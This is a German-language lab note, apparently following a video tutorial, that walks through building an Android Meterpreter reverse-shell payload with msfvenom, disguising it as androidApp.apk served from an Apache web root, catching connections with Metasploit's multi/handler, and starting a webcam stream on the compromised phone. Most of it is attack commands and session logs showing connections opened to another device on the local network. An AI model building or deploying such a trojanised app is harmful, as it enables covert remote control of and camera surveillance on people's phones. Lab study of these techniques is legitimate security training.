## MSFVenom Android 
### Datum: 17.05.2020
[Access Android with Metasploit Kali (Cybersecurity) Video](https://www.youtube.com/watch?v=YRm-St0bJhU&list=PLcgT0whF7sjZj3XbZyUIEYeH4jAFIXKks&index=3&t=0s)<br>

---
### <b>Übung<b>

> ip a
```
192.168.178.34 (unsere Maschine)
```
> msfvenom --help 
```
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```
<b>LHOST</b> Attacker Maschine
> sudo -s <br>
> msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.178.34 LPORT=4444 R > /var/www/html/androidApp.apk <b>
```
root@kali:/home/david# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.178.34 LPORT=4444 R > /var/www/html/androidApp.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 10188 bytes
```
> service apache2 start<br>
> serice apache2 status
```
 apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: active (running) since Sun 2020-05-17 18:23:09 CEST; 13s ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 4360 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 4371 (apache2)
      Tasks: 6 (limit: 6325)
     Memory: 18.3M
     CGroup: /system.slice/apache2.service
             ├─4371 /usr/sbin/apache2 -k start
             ├─4372 /usr/sbin/apache2 -k start
             ├─4373 /usr/sbin/apache2 -k start
             ├─4374 /usr/sbin/apache2 -k start
lines 1-13
```
> msfconsole <br>
> use exploit/multi/handler<br>
> set payload android/meterpreter/reverse_tcp<br>
> show options 
```
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (android/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```
> set LHOST 192.168.178.34<br>
> exploit<br>
Vorher muss die app installiert werden
```
[*] Started reverse TCP handler on 192.168.178.34:4444 
[*] Sending stage (73735 bytes) to 192.168.178.21
[*] Meterpreter session 1 opened (192.168.178.34:4444 -> 192.168.178.21:48880) at 2020-05-17 18:47:04 +0200
[*] Sending stage (73735 bytes) to 192.168.178.21
[*] Meterpreter session 2 opened (192.168.178.34:4444 -> 192.168.178.21:48882) at 2020-05-17 18:47:05 +0200
[*] Sending stage (73735 bytes) to 192.168.178.21
[*] Meterpreter session 3 opened (192.168.178.34:4444 -> 192.168.178.21:48886) at 2020-05-17 18:47:05 +0200
[*] Sending stage (73735 bytes) to 192.168.178.21
```
> background<br>
> sessions<br>
> sessions -i 1<br>
> help <br>

<b> HAVE FUN </b>

---
> webacam_stream -d 150 -i 2
> 

